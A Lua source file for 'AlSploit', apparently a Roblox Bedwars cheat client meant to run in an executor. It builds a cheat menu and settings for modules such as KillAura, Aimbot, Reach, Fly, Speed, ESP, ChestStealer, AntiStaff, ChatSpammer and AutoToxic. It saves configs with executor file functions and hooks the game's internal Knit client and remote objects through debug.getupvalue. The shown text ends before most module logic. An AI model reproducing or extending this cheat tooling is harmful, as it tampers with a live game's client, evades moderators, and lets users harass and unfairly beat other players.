local Owner = "56345b7435"

local LocalPlayer = game.Players.LocalPlayer

local CollectionService = game:GetService("CollectionService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService = game:GetService("UserInputService")
local LightingService = game:GetService("Lighting")
local PlayerService = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local StatsService = game:GetService("Stats")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")
local WorkSpace = game:GetService("Workspace") or game.Workspace

local AlSploit = Instance.new("ScreenGui")
local ContainerFrame = Instance.new("Frame")
local ContainerFrameUIListLayout = Instance.new("UIListLayout")
local NotificationContainer = Instance.new("Frame")
local NotificationContainerUIListLayout = Instance.new("UIListLayout")
local UIAspectRatioConstraintOpen = Instance.new("UIAspectRatioConstraint")
local UIStroke = Instance.new("UIStroke")
local UICorner = Instance.new("UICorner")
local Open = Instance.new("ImageButton")
local Blur = Instance.new("BlurEffect")

local DefaultLayoutOrder = 0

task.spawn(function()
	AlSploit.Name = "AlSploit"
	AlSploit.Parent = LocalPlayer:WaitForChild("PlayerGui")
	AlSploit.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	AlSploit.ResetOnSpawn = false

	ContainerFrame.Name = "ContainerFrame"
	ContainerFrame.Parent = AlSploit
	ContainerFrame.BackgroundColor3 = Color3.new(1, 1, 1)
	ContainerFrame.BackgroundTransparency = 1.000
	ContainerFrame.BorderColor3 = Color3.new(0, 0, 0)
	ContainerFrame.BorderSizePixel = 0
	ContainerFrame.Position = UDim2.new(0, 0, 0, 0)
	ContainerFrame.Size = UDim2.new(1, 0, 1, 0)
	ContainerFrame.Visible = false

	ContainerFrameUIListLayout.Parent = ContainerFrame
	ContainerFrameUIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
	ContainerFrameUIListLayout.Padding = UDim.new(0, 50)
	ContainerFrameUIListLayout.FillDirection = Enum.FillDirection.Horizontal
	ContainerFrameUIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center

	NotificationContainer.Name = "NotificationContainer"
	NotificationContainer.Parent = AlSploit
	NotificationContainer.BackgroundColor3 = Color3.new(1, 1, 1)
	NotificationContainer.BackgroundTransparency = 1.000
	NotificationContainer.BorderColor3 = Color3.new(0, 0, 0)
	NotificationContainer.BorderSizePixel = 0
	NotificationContainer.Position = UDim2.new(0.8, 0, 0, 0)
	NotificationContainer.Size = UDim2.new(0.2, 0, 0.980487823, 0)

	NotificationContainerUIListLayout.Parent = NotificationContainer
	NotificationContainerUIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
	NotificationContainerUIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
	NotificationContainerUIListLayout.VerticalAlignment = Enum.VerticalAlignment.Bottom
	NotificationContainerUIListLayout.Padding = UDim.new(0, 10)

	UIStroke.Parent = Open
	UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	UIStroke.Thickness = 2
	UIStroke.Color = Color3.new(0.411765, 0.215686, 1)

	Open.Name = "Open"
	Open.Parent = AlSploit
	Open.BackgroundColor3 = Color3.new(1, 1, 1)
	Open.BorderColor3 = Color3.new(0, 0, 0)
	Open.BorderSizePixel = 0
	Open.Position = UDim2.new(0.963, 0, 0.352, 0)
	Open.Size = UDim2.new(0.0330, 0, 0.0838, 0)
	Open.Image = "rbxassetid://16296032484"

	UICorner.CornerRadius = UDim.new(0, 6)
	UICorner.Parent = Open

	UIAspectRatioConstraintOpen.Parent = Open
	UIAspectRatioConstraintOpen.AspectRatio = 1

	Blur.Parent = LightingService
	Blur.Enabled = false
	Blur.Size = 16

	task.spawn(function()
		Open.Activated:Connect(function()
			ContainerFrame.Visible = not ContainerFrame.Visible
			Blur.Enabled = not Blur.Enabled
		end)
	end)
end)

local function CreateTab(Name)
	local Tab = Instance.new("Frame")
	local UICorner = Instance.new("UICorner")
	local CornerFix = Instance.new("Frame")
	local ModulesContainer = Instance.new("Frame")	
	local UIListLayout = Instance.new("UIListLayout")	
	local Title = Instance.new("TextLabel")
	local UIGradient = Instance.new("UIGradient")
	local UITextSizeConstraint = Instance.new("UITextSizeConstraint")

	Tab.Name = "Tab"
	Tab.Parent = ContainerFrame
	Tab.BackgroundColor3 = Color3.new(0, 0, 0)
	Tab.BorderColor3 = Color3.new(0, 0, 0)
	Tab.BorderSizePixel = 0
	Tab.Position = UDim2.new(0.434, 0, 0, 0)
	Tab.Size = UDim2.new(0.142, 0, 0.0490, 0)

	UICorner.CornerRadius = UDim.new(0, 7)
	UICorner.Parent = Tab

	CornerFix.Name = "CornerFix"
	CornerFix.Parent = Tab
	CornerFix.BackgroundColor3 = Color3.new(0, 0, 0)
	CornerFix.BorderColor3 = Color3.new(0, 0, 0)
	CornerFix.BorderSizePixel = 0
	CornerFix.Position = UDim2.new(0, 0, 0.371, 0)
	CornerFix.Size = UDim2.new(1, 0, 0.629, 0)

	ModulesContainer.Name = "ModulesContainer"
	ModulesContainer.Parent = Tab
	ModulesContainer.BackgroundColor3 = Color3.new(1, 1, 1)
	ModulesContainer.BackgroundTransparency = 1.000
	ModulesContainer.BorderColor3 = Color3.new(0, 0, 0)
	ModulesContainer.BorderSizePixel = 0
	ModulesContainer.Position = UDim2.new(0, 0, 1, 0)
	ModulesContainer.Size = UDim2.new(1, 0, 21.429, 0)

	UIListLayout.Parent = ModulesContainer
	UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center
	UIListLayout.FillDirection = Enum.FillDirection.Vertical
	UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder	

	Title.Name = "Title"
	Title.Parent = Tab
	Title.BackgroundColor3 = Color3.new(1, 1, 1)
	Title.BackgroundTransparency = 1.000
	Title.BorderColor3 = Color3.new(0, 0, 0)
	Title.BorderSizePixel = 0
	Title.Position = UDim2.new(0, 0, 0.124, 0)
	Title.Size = UDim2.new(1, 0, 0.743, 0)
	Title.Font = Enum.Font.GothamBold
	Title.Text = Name
	Title.TextColor3 = Color3.new(255, 255, 255)
	Title.TextScaled = true
	Title.TextSize = 20
	Title.TextWrapped = true

	UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
	UIGradient.Rotation = 90
	UIGradient.Parent = Title

	UITextSizeConstraint.Parent = Title
	UITextSizeConstraint.MaxTextSize = 20

	return ModulesContainer
end

local function CreateToggle(Parent, Name, DefaultValue, CallBack)
	local Toggle = Instance.new("TextButton")
	local UIGradient = Instance.new("UIGradient")
	local UIPadding = Instance.new("UIPadding")	
	local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
	local DropDownButton = Instance.new("ImageButton")

	local CallBackValue = DefaultValue

	local LayoutOrder = 0

	local function CallBackToggle(Value)		
		task.spawn(function()
			if Value == true then
				CallBackValue = true
				UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}

				CallBack(true)
			end
		end)

		task.spawn(function()
			if Value == false then
				CallBackValue = false
				UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}

				CallBack(false)
			end
		end)
	end

	Toggle.Name = "Toggle"
	Toggle.Parent = Parent
	Toggle.BackgroundColor3 = Color3.new(0, 0, 0)
	Toggle.BackgroundTransparency = 0.150
	Toggle.BorderColor3 = Color3.new(0, 0, 0)
	Toggle.BorderSizePixel = 0
	Toggle.Position = UDim2.new(2.873, 0, 0, 0)
	Toggle.Size = UDim2.new(1, 0, 0.041, 0)
	Toggle.AutoButtonColor = false
	Toggle.Font = Enum.Font.GothamBold
	Toggle.Text = Name
	Toggle.TextColor3 = Color3.new(1, 1, 1)
	Toggle.TextScaled = true
	Toggle.TextSize = 14
	Toggle.TextWrapped = true
	Toggle.TextXAlignment = Enum.TextXAlignment.Left
	Toggle.LayoutOrder = DefaultLayoutOrder + 10

	LayoutOrder = Toggle.LayoutOrder
	DefaultLayoutOrder = LayoutOrder

	UIGradient.Rotation = 90
	UIGradient.Parent = Toggle

	UIPadding.Parent = Toggle
	UIPadding.PaddingLeft = UDim.new(0, 15)

	UITextSizeConstraint.Parent = Toggle
	UITextSizeConstraint.MaxTextSize = 14

	DropDownButton.Name = "DropDownButton"
	DropDownButton.Parent = Toggle
	DropDownButton.BackgroundColor3 = Color3.new(1, 1, 1)
	DropDownButton.BackgroundTransparency = 1.000
	DropDownButton.BorderColor3 = Color3.new(0, 0, 0)
	DropDownButton.BorderSizePixel = 0
	DropDownButton.Position = UDim2.new(0.822, 0, 0.176, 0)
	DropDownButton.Rotation = 90.000
	DropDownButton.Size = UDim2.new(0.115, 0, 0.618, 0)
	DropDownButton.Image = "http://www.roblox.com/asset/?id=12809025337"	

	task.spawn(function()
		CallBackToggle(CallBackValue)
	end)

	task.spawn(function()
		Toggle.Activated:Connect(function()
			CallBackToggle(not CallBackValue)
		end)
	end)

	return Toggle, DropDownButton, LayoutOrder, UIGradient
end

local function CreateKeyBind(Parent, DefaultValue, LayoutOrder, CallBack)
	local KeyBind = Instance.new("TextButton")
	local UIGradient = Instance.new("UIGradient")
	local UITextSizeConstraint = Instance.new("UITextSizeConstraint")

	local function CallBackToggle(Value)
		CallBack(Value)
	end

	KeyBind.Name = "KeyBind"
	KeyBind.Parent = Parent
	KeyBind.BackgroundColor3 = Color3.new(0, 0, 0)
	KeyBind.BackgroundTransparency = 0.150
	KeyBind.BorderColor3 = Color3.new(0, 0, 0)
	KeyBind.BorderSizePixel = 0
	KeyBind.Position = UDim2.new(0, 0, 0.0765, 0)
	KeyBind.Size = UDim2.new(1, 0, 0.025, 0)
	KeyBind.AutoButtonColor = false
	KeyBind.Font = Enum.Font.GothamBold
	KeyBind.Text = "KeyBind: " .. DefaultValue
	KeyBind.TextColor3 = Color3.new(1, 1, 1)
	KeyBind.TextScaled = true
	KeyBind.TextSize = 11
	KeyBind.LayoutOrder = LayoutOrder

	UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
	UIGradient.Rotation = 90
	UIGradient.Parent = KeyBind

	UITextSizeConstraint.Parent = KeyBind
	UITextSizeConstraint.MaxTextSize = 11

	task.spawn(function()
		local InputValue = false
		local Value = false

		KeyBind.Activated:Connect(function()
			if Value == false then
				InputValue = true	
				KeyBind.Text = "..."
			end

			if Value == true and InputValue == true then
				KeyBind.Text = "KeyBind: " .. "..."
				InputValue = false
				CallBackToggle("...")
			end

			Value = not Value
		end)

		task.spawn(function()
			UserInputService.InputBegan:Connect(function(Input)
				if InputValue == true and not UserInputService:GetFocusedTextBox() then
					if Input.KeyCode and Input.UserInputType == Enum.UserInputType.Keyboard then
						KeyBind.Text = "KeyBind: " .. Input.KeyCode.Name

						CallBackToggle(Input.KeyCode.Name)
						InputValue = false
					end
				end
			end)
		end)
	end)

	return KeyBind
end

local function CreateMiniToggle(Parent, Name, DefaultValue, LayoutOrder, CallBack)
	local MiniToggle = Instance.new("TextButton")
	local UIGradient = Instance.new("UIGradient")

	local CallBackValue = DefaultValue

	local function CallBackToggle(Value)		
		task.spawn(function()
			if Value == true then
				CallBackValue = true
				UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}

				CallBack(true)
			end
		end)

		task.spawn(function()
			if Value == false then
				CallBackValue = false
				UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(1, 1, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(1, 1, 1))}

				CallBack(false)
			end
		end)
	end

	MiniToggle.Name = "MiniToggle"
	MiniToggle.Parent = Parent
	MiniToggle.BackgroundColor3 = Color3.new(0, 0, 0)
	MiniToggle.BackgroundTransparency = 0.150
	MiniToggle.BorderColor3 = Color3.new(0, 0, 0)
	MiniToggle.BorderSizePixel = 0
	MiniToggle.Position = UDim2.new(0, 0, 0.0765, 0)
	MiniToggle.Size = UDim2.new(1, 0, 0.0354, 0)
	MiniToggle.AutoButtonColor = false
	MiniToggle.Font = Enum.Font.GothamBold
	MiniToggle.Text = Name
	MiniToggle.TextColor3 = Color3.new(1, 1, 1)
	MiniToggle.TextSize = 11
	MiniToggle.LayoutOrder = LayoutOrder

	UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
	UIGradient.Rotation = 90
	UIGradient.Parent = MiniToggle

	task.spawn(function()
		CallBackToggle(CallBackValue)		
	end)

	task.spawn(function()
		MiniToggle.Activated:Connect(function()
			CallBackToggle(not CallBackValue)
		end)
	end)

	return MiniToggle
end

local function CreateSlider(Parent, Name, DefaultValue, MaximumValue, LayoutOrder, CallBack)
	local Slider = Instance.new("Frame")
	local SliderFrame = Instance.new("Frame")
	local Fill = Instance.new("Frame")
	local UIGradient = Instance.new("UIGradient")
	local Bar = Instance.new("TextButton")
	local UICorner = Instance.new("UICorner")	
	local UIStroke = Instance.new("UIStroke")
	local NameDisplay = Instance.new("TextLabel")
	local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
	local ValueDisplay = Instance.new("TextLabel")
	local UITextSizeConstraint_2 = Instance.new("UITextSizeConstraint")

	Slider.Name = "Slider"
	Slider.Parent = Parent
	Slider.BackgroundColor3 = Color3.new(0, 0, 0)
	Slider.BackgroundTransparency = 0.150
	Slider.BorderColor3 = Color3.new(0, 0, 0)
	Slider.BorderSizePixel = 0
	Slider.Position = UDim2.new(0, 0, 0.123, 0)
	Slider.Size = UDim2.new(1, 0, 0.058, 0)
	Slider.LayoutOrder = LayoutOrder

	SliderFrame.Name = "SliderFrame"
	SliderFrame.Parent = Slider
	SliderFrame.BackgroundColor3 = Color3.new(1, 1, 1)
	SliderFrame.BackgroundTransparency = 1.000
	SliderFrame.BorderColor3 = Color3.new(0, 0, 0)
	SliderFrame.BorderSizePixel = 0
	SliderFrame.Position = UDim2.new(0.150, 0, 0.582, 0)
	SliderFrame.Size = UDim2.new(0.700, 0, 0.0600, 0)

	Fill.Name = "Fill"
	Fill.Parent = SliderFrame
	Fill.BackgroundColor3 = Color3.new(1, 1, 1)
	Fill.BorderColor3 = Color3.new(0, 0, 0)
	Fill.BorderSizePixel = 0
	Fill.Position = UDim2.new(-0.00672, 0, -0.329, 0)
	Fill.Size = UDim2.new(1.000, 0, 1, 0)

	UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
	UIGradient.Rotation = 90
	UIGradient.Parent = Fill

	Bar.Name = "Bar"
	Bar.Parent = SliderFrame
	Bar.BackgroundColor3 = Color3.new(0.411765, 0.215686, 1)
	Bar.BorderColor3 = Color3.new(0, 0, 0)
	Bar.BorderSizePixel = 0
	Bar.Position = UDim2.new(0.199, 0, -1.768, 0)
	Bar.Size = UDim2.new(0.0650, 0, 3.725, 0)
	Bar.ZIndex = 2
	Bar.AutoButtonColor = false
	Bar.Font = Enum.Font.GothamBold
	Bar.Text = ""
	Bar.TextColor3 = Color3.new(1, 1, 1)
	Bar.TextSize = 14.000

	UICorner.CornerRadius = UDim.new(1, 0)
	UICorner.Parent = Bar

	UIStroke.Parent = Bar
	UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	UIStroke.Thickness = 1
	UIStroke.Color = Color3.new(0, 0, 0)

	NameDisplay.Name = "NameDisplay"
	NameDisplay.Parent = Slider
	NameDisplay.BackgroundColor3 = Color3.new(1, 1, 1)
	NameDisplay.BackgroundTransparency = 1.000
	NameDisplay.BorderColor3 = Color3.new(0, 0, 0)
	NameDisplay.BorderSizePixel = 0
	NameDisplay.Position = UDim2.new(0.145, 0, -0.118, 0)
	NameDisplay.Size = UDim2.new(0, 50, 0, 30)
	NameDisplay.Font = Enum.Font.GothamBold
	NameDisplay.Text = Name
	NameDisplay.TextColor3 = Color3.new(0.411765, 0.215686, 1)
	NameDisplay.TextScaled = true
	NameDisplay.TextSize = 10

	UITextSizeConstraint.Parent = NameDisplay
	UITextSizeConstraint.MaxTextSize = 10

	ValueDisplay.Name = "ValueDisplay"
	ValueDisplay.Parent = Slider
	ValueDisplay.BackgroundColor3 = Color3.new(1, 1, 1)
	ValueDisplay.BackgroundTransparency = 1.000
	ValueDisplay.BorderColor3 = Color3.new(0, 0, 0)
	ValueDisplay.BorderSizePixel = 0
	ValueDisplay.Position = UDim2.new(0.635, 0, -0.118, 0)
	ValueDisplay.Size = UDim2.new(0, 50, 0, 30)
	ValueDisplay.Font = Enum.Font.GothamBold
	ValueDisplay.Text = DefaultValue
	ValueDisplay.TextColor3 = Color3.new(0.411765, 0.215686, 1)
	ValueDisplay.TextScaled = true
	ValueDisplay.TextSize = 10

	UITextSizeConstraint_2.Parent = ValueDisplay
	UITextSizeConstraint_2.MaxTextSize = 10

	local Debounce = true

	local function Snap(Number, Factor)
		if Factor == 0 then
			return Number
		end

		if Factor ~= 0 then
			return math.floor(Number / Factor + 0.5) * Factor
		end
	end

	task.spawn(function()
		Bar.MouseButton1Down:Connect(function()
			Debounce = false
		end)

		UserInputService.InputEnded:connect(function(Input)
			if Input.UserInputType == Enum.UserInputType.MouseButton1 then
				Debounce = true
			end
		end)
	end)

	task.spawn(function()
		local BarPosition = Bar.Position

		local TweenInformation = TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In, 0, false, 0)
		local PositionTween = TweenService:Create(Bar, TweenInformation, {Position = UDim2.new(DefaultValue / MaximumValue - 0.05, 0, BarPosition.Y.Scale, BarPosition.Y.Offset)})

		PositionTween:Play()

		local TweenInformation = TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In, 0, false, 0)
		local SizeTween = TweenService:Create(Fill, TweenInformation, {Size = UDim2.new(DefaultValue / MaximumValue, 0, 1, 0)})

		SizeTween:Play()
	end)

	task.spawn(function()
		repeat
			task.wait()

			if Debounce == false then
				local MousePosition = UserInputService:GetMouseLocation().X
				local FramePosition = Slider.AbsolutePosition.X
				local FrameSize = Slider.AbsoluteSize.X
				local BarPosition = Bar.Position

				local Position = Snap((MousePosition - FramePosition) / FrameSize, 0.01)
				local Percentage = math.clamp(Position, 0, 1)

				local TweenInformation = TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In, 0, false, 0)
				local PositionTween = TweenService:Create(Bar, TweenInformation, {Position = UDim2.new(Percentage, 0, BarPosition.Y.Scale, BarPosition.Y.Offset)})

				PositionTween:Play()

				local TweenInformation = TweenInfo.new(0.1, Enum.EasingStyle.Linear, Enum.EasingDirection.In, 0, false, 0)
				local SizeTween = TweenService:Create(Fill, TweenInformation, {Size = UDim2.new(Percentage, 0, 1, 0)})

				SizeTween:Play()

				ValueDisplay.Text = math.round(Percentage * MaximumValue)

				CallBack(math.round(Percentage * MaximumValue))
			end
		until not Slider
	end)

	return Slider
end

local function CreateNotification(Duration, Message)
	local Notification = Instance.new("Frame")
	local UIStroke = Instance.new("UIStroke")
	local UIGradient = Instance.new("UIGradient")
	local UICorner = Instance.new("UICorner")
	local Text = Instance.new("TextLabel")
	local UITextSizeConstraint = Instance.new("UITextSizeConstraint")

	Notification.Name = "Notification"
	Notification.Parent = NotificationContainer
	Notification.BackgroundColor3 = Color3.new(0, 0, 0)
	Notification.BackgroundTransparency = 0.150
	Notification.BorderColor3 = Color3.new(0, 0, 0)
	Notification.BorderSizePixel = 0
	Notification.Position = UDim2.new(0.226, 0, 0, 0)
	Notification.Size = UDim2.new(0, 0, 0, 0)

	UIStroke.Parent = Notification
	UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	UIStroke.Thickness = 2
	UIStroke.Color = Color3.new(1, 1, 1)

	UIGradient.Color =  ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.new(0.411765, 0.215686, 1)), ColorSequenceKeypoint.new(1.00, Color3.new(0.560784, 0.411765, 1))}
	UIGradient.Parent = UIStroke

	UICorner.Parent = Notification
	UICorner.CornerRadius = UDim.new(0, 6)

	Text.Name = "Text"
	Text.Parent = Notification
	Text.BackgroundColor3 = Color3.new(1, 1, 1)
	Text.BackgroundTransparency = 1.000
	Text.BorderColor3 = Color3.new(0, 0, 0)
	Text.BorderSizePixel = 0
	Text.Position = UDim2.new(-0.00264, 0, 0, 0)
	Text.Size = UDim2.new(1, 0, 1, 0)
	Text.Font = Enum.Font.GothamBold
	Text.Text = Message
	Text.TextColor3 = Color3.new(255, 255, 255)
	Text.TextScaled = true
	Text.TextSize = 13

	UITextSizeConstraint.Parent = Text
	UITextSizeConstraint.MaxTextSize = 13

	task.spawn(function()
		local NotificationSize = UDim2.new(1, 0, 0.087, 0)

		local TweenInformation = TweenInfo.new(0.15, Enum.EasingStyle.Linear, Enum.EasingDirection.Out, 0, false, 0)
		local SizeTween = TweenService:Create(Notification, TweenInformation, {Size = NotificationSize})

		SizeTween:Play()

		task.wait(Duration)

		NotificationSize = UDim2.new(0, 0, 0, 0)

		local SizeTween2 = TweenService:Create(Notification, TweenInformation, {Size = NotificationSize})

		SizeTween2:Play()

		task.spawn(function()
			task.wait(TweenInformation.Time)

			Notification:Destroy()
		end)
	end)
end

local function CreateFlyHud()
	local Background = Instance.new("Frame")
	local UIStroke = Instance.new("UIStroke")
	local UICorner = Instance.new("UICorner")
	local Text = Instance.new("TextLabel")
	local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
	local DisplayBackground = Instance.new("Frame")
	local UICorner_2 = Instance.new("UICorner")
	local Display = Instance.new("Frame")
	local UICorner_3 = Instance.new("UICorner")

	Background.Name = "Background"
	Background.Parent = AlSploit
	Background.BackgroundColor3 = Color3.new(0, 0, 0)
	Background.BackgroundTransparency = 0.250
	Background.BorderColor3 = Color3.new(0, 0, 0)
	Background.BorderSizePixel = 0
	Background.Position = UDim2.new(0.41, 0, 0.7, 0)
	Background.Size = UDim2.new(0.178, 0, 0.085, 0)

	UIStroke.Parent = Background
	UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	UIStroke.Thickness = 2


	task.spawn(function()
		repeat
			task.wait(0.001)

			UIStroke.Color = Color3.fromHSV(tick() % 5 / 5, 1, 1)
		until not game
	end)

	UICorner.Parent = Background

	Text.Name = "Text"
	Text.Parent = Background
	Text.BackgroundColor3 = Color3.new(255, 255, 255)
	Text.BackgroundTransparency = 1.000
	Text.BorderColor3 = Color3.new(0, 0, 0)
	Text.BorderSizePixel = 0
	Text.Position = UDim2.new(-0.00333, 0, 0.511, 0)
	Text.Size = UDim2.new(1, 0, 0.489, 0)
	Text.Font = Enum.Font.GothamBold
	Text.Text = "1"
	Text.TextColor3 = Color3.new(0.411765, 0.215686, 1)
	Text.TextScaled = true
	Text.TextSize = 20
	Text.TextWrapped = true

	UITextSizeConstraint.Parent = Text
	UITextSizeConstraint.MaxTextSize = 20

	DisplayBackground.Name = "DisplayBackground"
	DisplayBackground.Parent = Background
	DisplayBackground.BackgroundColor3 = Color3.new(0, 0, 0)
	DisplayBackground.BorderColor3 = Color3.new(0, 0, 0)
	DisplayBackground.BorderSizePixel = 0
	DisplayBackground.Position = UDim2.new(0.229, 0, 0.267, 0)
	DisplayBackground.Size = UDim2.new(0.545, 0, 0.150, 0)

	UICorner_2.CornerRadius = UDim.new(0, 6)
	UICorner_2.Parent = DisplayBackground

	Display.Name = "Display"
	Display.Parent = DisplayBackground
	Display.BackgroundColor3 = Color3.new(0.411765, 0.215686, 1)
	Display.BorderColor3 = Color3.new(0, 0, 0)
	Display.BorderSizePixel = 0
	Display.Position = UDim2.new(0, 0, 0, 0)
	Display.Size = UDim2.new(0, 0, 1, 0)
	Display.ZIndex = 2

	UICorner_3.CornerRadius = UDim.new(0, 6)
	UICorner_3.Parent = Display

	return Background, Text, Display
end

function CreateOutline(Player)
	if IsAlive(Player) then
		local BillBoard = Instance.new("BillboardGui")
		local Frame = Instance.new("Frame")
		local UIStroke = Instance.new("UIStroke")

		BillBoard.Size = UDim2.new(4, 0, 4, 0)
		BillBoard.AlwaysOnTop = true
		BillBoard.Name = "Esp"	
		BillBoard.Parent = Player.Character.PrimaryPart

		Frame.Size = UDim2.new(1, 0, 1.5, 0)
		Frame.Position = UDim2.new(0, 0, -Player.Character.LowerTorso.Size.Y / 2 or -Player.PrimaryPart.Size.Y / 2, 0)
		Frame.BackgroundTransparency = 1	
		Frame.Parent = BillBoard

		UIStroke.Thickness = 1.5
		UIStroke.Color = Player.TeamColor.Color
			
		UIStroke.Transparency = 0
		UIStroke.Parent = Frame
	end
end

local Settings = {}
local Loaded = false

local SaveFileName = "AlSploitRebornSaving45322425.lua"

local function CreateSettingsFile()
	local DefaultSetting = {Properties = {Value = false}}

	local MetaTable = {__index, DefaultSetting.Properties}

	Settings = {
		CustomHealthBar = {KeyBind = "..."},
		CustomInventory = {KeyBind = "..."},
		NoPlacementCps = {KeyBind = "..."},
		ChestStealer = {Range = 30, KeyBind = "..."},
		InfiniteJump = {KeyBind = "..."},
		AutoClicker = {Cps = 100, ButterFlyClick = false, BlatantClick = true, JitterClick = false, KeyBind = "..."},
		NoKnockBack = {KeyBind = "..."},	
		InfiniteFly = {KeyBind = "..."},
		DamageBoost = {KeyBind = "..."},
		ChatSpammer = {Speed = 50, KeyBind = "..."},
		FpsBooster = {KeyBind = "..."},
		Indicators = {KeyBind = "..."},
		AutoReport = {KeyBind = "..."},
		MotionBlur = {KeyBind = "..."},
		WinterSky = {KeyBind = "..."},
		NoNameTag = {KeyBind = "..."},
		AntiStaff = {Kick = false, KeyBind = "..."},
		AutoToxic = {KeyBind = "..."},
		GalaxySky = {KeyBind = "..."},
		PlayAgain = {KeyBind = "..."},
		Invisible = {KeyBind = "..."},
		AimAssist = {Range = 20, KeyBind = "..."},
		Scaffold = {ExpandDistance = 1, KeyBind = "..."},
		KillAura = {Range = 21, CustomAnimation = true, ToolCheck = false, KeyBind = "..."},
		AntiVoid = {Transparency = 0.65, KeyBind = "..."},
		AutoBank = {Range = 30, KeyBind = "..."},
		HighJump = {KeyBind = "..."},
		PlayerTp = {KeyBind = "..."},
		Tracers = {KeyBind = "..."},
		AutoKit = {KeyBind = "..."},
		AntiAfk = {KeyBind = "..."},
		AutoBuy = {KeyBind = "..."},
		Sprint = {KeyBind = "..."},
		NoFall = {KeyBind = "..."},
		Aimbot = {ToolCheck = false, KeyBind = "..."},
		Spider = {Speed = 25, KeyBind = "..."},
		Strafe = {Speed = 22, Range = 20, GoBackwards = true, KeyBind = "..."},
		Speed = {Speed = 23, KeyBind = "..."},
		Reach = {KeyBind = "..."},
		Nuker = {Range = 30, CustomAnimation = true, BreakOres = true, KeyBind = "..."},
		BedTp = {KeyBind = "..."},
		Cape = {KeyBind = "...", Sigma = false},
		Fly = {KeyBind = "..."},
		Esp = {KeyBind = "..."},
		Fov = {Fov = 100, KeyBind = "..."}
	}

	task.spawn(function()
		for i, v in next, Settings do
			setmetatable(v, MetaTable)
		end
	end)

	task.spawn(function()
		if not (writefile or makefolder or readfile or isfile) then
			CreateNotification(5, "Your executor does not support saving.")

			Loaded = true
		end

		if writefile and makefolder and readfile and isfile then 
			makefolder("AlSploitBedwarsConfigSaving")

			local JSONEncodeSettings = HttpService:JSONEncode(Settings)

			writefile("AlSploitBedwarsConfigSaving/" .. SaveFileName, JSONEncodeSettings)
		end
	end)	
end

local function CheckFirstTime()
	if isfile("AlSploitBedwarsConfigSaving/" .. SaveFileName) then
		return false
	end

	if not isfile("AlSploitBedwarsConfigSaving/" .. SaveFileName) then
		return true
	end
end

local function SaveSettings()	
	local JSONEncodeSettings = HttpService:JSONEncode(Settings)

	writefile("AlSploitBedwarsConfigSaving/" .. SaveFileName, JSONEncodeSettings)	
end

local function LoadSettings()
	if isfile("AlSploitBedwarsConfigSaving/" .. SaveFileName) then
		Settings = HttpService:JSONDecode(readfile("AlSploitBedwarsConfigSaving/" .. SaveFileName))

		Loaded = true
	end
end

task.spawn(function()
	local FirstTime = CheckFirstTime()

	if FirstTime == true then
		CreateSettingsFile()
	end
end)

task.spawn(function()
	if isfile then
		LoadSettings()

		task.wait(0.1)

		Loaded = true
	end
end)

task.spawn(function()
	repeat
		task.wait(1)

		if writefile then
			SaveSettings()
		end	
	until not game
end)

repeat task.wait() until Loaded == true

local KnitClient, KnitClientGotten = nil, false

task.spawn(function()
	KnitClient = debug.getupvalue(require(LocalPlayer.PlayerScripts.TS.knit).setup, 6)
end)

task.spawn(function()
	if KnitClient then
		KnitClientGotten = true
	end
end)

task.spawn(function()
	if KnitClientGotten == false then
		CreateNotification(10, "Your executor will not support alot features.")
	end
end)

local Client, ClientGotten = nil, false

task.spawn(function()
	Client = require(ReplicatedStorage.TS.remotes).default.Client
end)

task.spawn(function()
	if Client then
		ClientGotten = true
	end
end)

task.spawn(function()
	if ClientGotten == false then
		CreateNotification(10, "Your executor will not support alot features.")
	end
end)

local Camera = WorkSpace.CurrentCamera
local OrigC0 = ReplicatedStorage.Assets.Viewmodel.RightHand.RightWrist.C0

local HannahPromptTriggerRemote = nil

task.spawn(function()
	if ClientGotten then
		HannahPromptTriggerRemote = Client:Get("HannahPromptTrigger")
	end	
end)

local Flamework = require(ReplicatedStorage["rbxts_include"]["node_modules"]["@flamework"].core.out).Flamework

